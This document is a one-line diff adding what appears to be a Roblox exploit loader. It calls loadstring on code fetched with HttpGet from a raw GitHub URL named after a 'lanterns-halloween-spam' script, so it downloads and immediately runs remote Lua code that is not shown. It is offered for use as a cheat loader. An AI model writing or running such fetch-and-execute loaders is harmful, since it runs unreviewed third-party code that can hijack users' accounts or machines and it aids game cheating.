@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/lanterns-halloween-spam7-1tz6kzpjmb2j5n.lua"))()
